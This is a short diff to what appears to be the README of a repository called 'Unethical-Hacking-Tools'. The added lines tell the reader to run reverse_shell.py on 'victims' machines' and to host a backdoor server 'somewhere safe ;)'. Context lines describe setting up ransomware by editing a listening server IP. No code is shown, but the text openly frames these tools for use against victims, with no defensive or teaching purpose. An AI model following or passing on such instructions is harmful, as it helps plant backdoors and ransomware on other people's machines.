@@ -43,6 +43,18 @@
 ##
 ## ============================================
 ## Usage
+## Dependencies
+## bash install-modules.sh
+##
+## ============================================
+## Backdoor
+## Victims' machines:
+## Use your creativity to find the way to run code in reverse_shell.py
+##
+## Backdoor Server:
+## Use your creativity to host server.py in somewhere safe ;)
+## 
+## ============================================
 ## Ransomware:
 ## cd Unethical-Hacking-Tools &&
 ## Edit the listening server IP in server.py in line 11 
